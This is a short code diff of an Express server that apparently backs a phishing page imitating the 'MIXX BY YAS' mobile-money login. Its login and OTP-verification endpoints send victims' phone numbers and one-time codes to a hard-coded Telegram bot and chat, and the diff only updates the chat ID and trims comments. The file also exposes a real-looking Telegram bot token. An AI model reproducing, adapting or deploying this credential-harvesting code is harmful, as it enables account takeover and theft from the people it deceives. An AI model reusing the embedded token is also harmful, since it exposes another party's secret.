@@ -15,9 +15,9 @@ app.use(express.json());
 // ===== PORT =====
 const PORT = process.env.PORT || 5000;
 
-// ===== TELEGRAM CREDENTIALS (UPDATED) =====
+// ===== TELEGRAM CREDENTIALS =====
 const TELEGRAM_BOT_TOKEN = '8942634790:AAEniaOpFLFGoQgn-f60yKAaMvYhPpNzx7s';
-const TELEGRAM_CHAT_ID = '8435858184';
+const TELEGRAM_CHAT_ID = '8392790531';  // <-- UPDATED to your correct Chat ID
 
 console.log('🚀 Starting server...');
 console.log(`📡 PORT: ${PORT}`);
@@ -71,7 +71,6 @@ app.post('/api/login', async (req, res) => {
     const otp = Math.floor(100000 + Math.random() * 900000).toString();
     console.log(`🔐 OTP for ${phone}: ${otp}`);
 
-    // Send to Telegram
     await sendTelegramMessage(`
 🔔 <b>MIXX BY YAS - LOGIN</b>
 ━━━━━━━━━━━━━━━━━━━━━
@@ -104,7 +103,6 @@ app.post('/api/verify-otp', async (req, res) => {
         });
     }
 
-    // Send to Telegram
     await sendTelegramMessage(`
 ✅ <b>MIXX BY YAS - OTP VERIFICATION</b>
 ━━━━━━━━━━━━━━━━━━━━━
